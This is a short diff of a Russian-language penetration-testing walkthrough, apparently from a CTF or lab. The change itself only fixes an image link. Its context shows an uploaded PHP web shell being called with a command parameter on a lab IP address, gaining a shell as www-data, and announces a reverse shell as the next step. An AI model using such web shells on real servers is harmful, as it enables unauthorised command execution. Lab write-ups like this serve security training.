@@ -122,7 +122,7 @@ nano ~/Desktop/shell.php
 http://10.113.159.145:3333/internal/uploads/shell.phtml?cmd=id
 ```
 
-[url results](images/url-results.jpg)
+![url results](images/url-results.jpg)
 
 И да, это сработало. Мы - `www-data`, теперь давайте получим `reverse-shell`
 
